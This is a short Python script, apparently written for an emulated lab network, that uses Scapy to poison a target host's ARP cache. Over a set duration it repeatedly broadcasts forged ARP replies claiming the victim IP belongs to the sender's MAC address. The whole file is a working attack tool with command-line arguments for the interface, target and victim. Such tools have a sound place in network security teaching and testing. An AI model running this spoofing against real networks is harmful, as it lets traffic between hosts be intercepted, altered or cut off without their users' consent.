"""ARP cache poisoning via Scapy — sends forged ARP replies claiming this host's MAC
owns victim_ip, to a target on the same emulated LAN segment. Requires root.
"""
import argparse
import time

from scapy.all import ARP, Ether, get_if_hwaddr, sendp


def run(iface, target_ip, victim_ip, interval=2, duration=10, verbose=True):
    my_mac = get_if_hwaddr(iface)
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        pkt = (Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") /
               ARP(op=2, psrc=victim_ip, hwsrc=my_mac, pdst=target_ip))
        sendp(pkt, iface=iface, verbose=0)
        sent += 1
        time.sleep(interval)
    if verbose:
        print(f"arp_spoof: sent {sent} forged replies claiming {victim_ip} is at {my_mac}")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--iface", required=True, help="e.g. h3-eth0")
    parser.add_argument("--target-ip", required=True, help="host whose ARP cache is poisoned")
    parser.add_argument("--victim-ip", required=True, help="IP being impersonated")
    parser.add_argument("--interval", type=float, default=2)
    parser.add_argument("--duration", type=float, default=10)
    args = parser.parse_args()
    run(args.iface, args.target_ip, args.victim_ip, args.interval, args.duration)


if __name__ == "__main__":
    main()
